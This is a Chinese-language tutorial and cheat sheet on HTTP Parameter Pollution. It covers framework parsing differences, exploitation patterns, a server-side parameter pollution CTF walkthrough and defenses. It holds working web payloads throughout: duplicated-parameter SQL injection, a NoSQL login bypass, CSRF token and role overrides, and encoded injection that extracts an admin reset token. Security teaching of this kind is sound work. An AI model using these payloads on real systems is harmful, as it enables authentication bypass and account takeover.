# HTTP 参数污染（HPP / HTTP Parameter Pollution）

## 一句话理解
同一个参数名在请求里提交两次，不同的组件对"取哪个值"策略不同（取第一个/取最后一个/逗号拼接/变成数组），攻击者利用这种不一致让校验层和执行层各看各的值，从而绕过校验、篡改业务逻辑。

## 基础理解
- HTTP 协议本身没有规定"重复参数取哪个"，各语言/框架各自为政，行为差异是先天的
- 一次请求往往要穿过 WAF → 反向代理 → 网关 → 应用框架 → 业务代码多层，**每一层都可能独立解析一遍参数；任何两层取值策略不一致，就存在"各取所需"的利用空间——这是 HPP 的利用根源**
- 概念由 Luca Carettoni 与 Stefano di Paola 在 OWASP AppSec Europe 2009 系统提出

### 各环境取值策略速查
| 环境 | `?a=1&a=2` 取到的值 |
| --- | --- |
| PHP（`$_GET['a']`） | 最后一个（`2`） |
| ASP.NET（`Request["a"]`） | 逗号拼接（`1,2`） |
| JSP/Servlet（`request.getParameter("a")`） | 第一个（`1`） |
| Tomcat（`getParameterValues("a")`） | 数组（`["1","2"]`） |
| Node/Express（querystring 解析） | 数组（`["1","2"]`） |
| Python Flask（`request.args.get('a')`） | 第一个（`1`） |
| Python Django（`request.GET['a']`） | 最后一个（`2`） |
| Ruby on Rails | 最后一个（`2`） |
| nginx（`$arg_a`） | 第一个（`1`） |

## 常见成因
- 框架默认静默处理重复参数（取首/取尾/拼接成数组），不报错不告警，开发者无感知
- 多层异构架构：WAF、网关、后端分属不同技术栈（如 nginx + Tomcat、云 WAF + PHP），解析行为天然不一致
- 服务端把用户输入直接拼进内部请求的查询串/URL，再被内部服务二次解析（服务端参数污染）
- 接口契约从未约定重复参数的语义，前端、网关、后端各自"想当然"

## 常见危害
- WAF/输入校验被绕过，为 SQL 注入、XSS 等后续攻击放行
- 业务风控与权限校验失效：金额、数量、角色、action 被篡改
- CSRF token、OAuth redirect_uri 等安全参数的校验被架空
- 类型混淆（期望字符串的位置收到数组/对象），可串联 NoSQL 注入等更深漏洞

## 典型利用思路
### 1. 绕过 WAF / 输入校验
```
GET /search?q=1&q=UNION SELECT password FROM users-- -
# WAF 只取第一个 q（=1，无害放行），PHP 后端取最后一个 q 执行注入
```

### 2. 绕过权限/风控校验（前后端分离、网关架构）
```
POST /transfer
amount=1000&amount=1
# 网关风控取最后一个 amount=1（小额合法，放行），JSP 后端取第一个 amount=1000 真正入账
```

### 3. 应用逻辑篡改：重复参数触发类型混淆
```
GET /login?user=admin&pass[$ne]=1
# PHP/qs 解析器把 pass 解析成数组/对象，绕过 === 'xxx' 的强比较
# 操作符注入详见 ../exp/EXP-NoSQL.md
POST /api/search
tag=a&tag[]=b
# 期望字符串的位置收到数组：轻则改变 SQL 语义，重则抛类型错误泄露栈信息
```

### 4. URL 片段覆盖：同名参数覆盖关键动作
```
GET /api/file?action=view&action=delete&id=1
# 前端路由/审计日志记录的是 view，后端实际执行 delete
```

### 5. 结合 JSON/表单切换的解析差异
```
POST /api/user
Content-Type: application/x-www-form-urlencoded

role=user&role=admin
# 网关按表单规则取一个值校验（role=user 合法），后端框架按 JSON 解析取到另一个值
# 同理：{"role":"user","data":{"role":"admin"}}，同名键出现在不同层，不同代码取到的层不同
```

## 实战排查思路
- **逐参数重复提交**：把每个参数都复制一份，`?p=orig&p=POLLUTE`，对比响应差异（长度、状态码、回显内容）
- **先定位取值策略**：提交 `?a=FIRST&a=SECOND`，看响应里回显哪个值，直接判断目标"取首/取尾/拼接"
- **Burp Intruder 批量**：payload 位置放在重复参数的第二个值上，payload 集合放敏感 payload（admin、delete、注入语句），观察哪些组合响应异常
- **关注中间件组合**：nginx + Tomcat、云 WAF + PHP、Java 网关 + Node 微服务等异构链路是重灾区
- **服务端参数污染探测**：用户输入被拼进内部请求时，注入 `%26`（&）、`%3D`（=）、`%23`（#），观察内部 API 报错信息变化（"Parameter is not supported" 即为注入生效信号）
- **对账审计**：对比审计日志记录的参数值与业务实际生效值，不一致即存在 HPP 空间

## 常见绕过思路
- **分号分隔**：`?a=1;a=2`——Tomcat 等把 `;` 当路径参数处理，WAF 规则可能只按 `&` 切分
- **数组语法强制**：`?a[]=1&a[]=2`——把标量参数强行变成数组，制造类型混淆
- **GET/POST 跨方法污染**：
```
POST /api/user?role=user HTTP/1.1

role=admin
# GET 和 POST 各带一个同名参数，网关查 GET 校验 role=user，后端读 POST 执行 role=admin
```
- **绕过 CSRF token 校验**：
```
token=<valid_token>&token=x
# 校验组件取到第一个（有效 token，放行），业务组件取到第二个，token 校验被架空
```
- **编码组合打服务端拼接**：`username=admin%26field=reset_token%23`——`%26` 注入新参数、`%23` 截断内部查询串，让内部 API 返回本不可见字段

## 案例：一道服务端参数污染 CTF 题流程

题目：忘记密码功能 `POST /forgot-password`，服务端把 `username` 未编码拼进内部 API `GET /internal/users?username=xxx&field=email`，flag 在管理员的密码重置令牌里。

1. **基线请求**：`username=administrator` 正常返回打码邮箱；改成 `administratorx` 返回 `Invalid username`——输入确实进入了内部查询。
2. **注入 & 探测**：提交 `username=administrator%26x=y`，返回 `Parameter is not supported`——内部 API 把 `&x=y` 当成了独立参数，**污染生效**。
3. **截断探测**：提交 `username=administrator%23`，返回 `Field not specified`——`#` 截断了内部查询串，暴露出隐藏参数 `field`。
4. **注入 field 并爆破**：提交 `username=administrator%26field=§x§%23`，Intruder 加载内置字典 `Server-side variable names` 爆破参数值。
5. **拿 token**：命中 `reset_token` 后，`username=administrator%26field=reset_token%23` 直接返回管理员重置令牌。
6. **收尾**：访问 `/forgot-password?reset_token=<token>` 重置管理员密码并登录，flag 入手。
7. **复盘根因**：外部服务把用户输入未编码拼进内部 URL，`&`/`#` 在内部请求中被二次解析——对输入做严格 URL 编码即可闭合。

## 防御要点
- **入口层明确拒绝重复参数**：检测到同名参数出现多次直接返回 400，这是最彻底的方案
- **统一取值策略**：WAF、网关、应用使用同一套解析规则和取值优先级，消除"各取所需"
- **入参规范化**：网关层按白名单过滤参数、去重合并后，再向后端转发唯一确定的值
- 框架层面避免混用取值接口（如 PHP 禁用 `$_REQUEST`、Java 明确 `getParameter` 与 `getParameterValues` 的选择并校验数组长度）
- 服务端发起内部请求时，对用户输入做严格 URL 编码后再拼接，禁止裸拼查询串
- WAF 增加重复参数计数规则：同名参数超过 1 次即告警/拦截

## 速查清单
```
# 1. 判定取值策略（观察响应回显 FIRST 还是 SECOND，还是两者拼接）
?a=FIRST&a=SECOND

# 2. WAF 绕过（PHP 后端取尾）
?q=safe&q=PAYLOAD

# 3. 校验绕过（Java/Flask 后端取首）
amount=PAYLOAD&amount=safe

# 4. 数组类型混淆
a[]=1&a[]=2

# 5. 分号分隔绕过
?a=1;a=2

# 6. 服务端参数污染（内部请求拼接场景）
username=admin%26field=reset_token%23
```

排查检查点：全部参数 × {重复提交、GET/POST 跨方法重名、数组语法、编码分隔符}，重点覆盖鉴权、金额、action、token、redirect_uri 类参数。

## 参考
- [OWASP HTTP Parameter Pollution](https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution)
- [CAPEC-460: HTTP Parameter Pollution (HPP)](https://capec.mitre.org/data/definitions/460.html)
- [PortSwigger Server-side parameter pollution](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)
- [PortSwigger Lab: Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)
- [AppSecEU09 原始论文（Carettoni & di Paola）](https://owasp.org/www-pdf-archive/AppSecEU09_CarettoniDiPaola_v0.8.pdf)
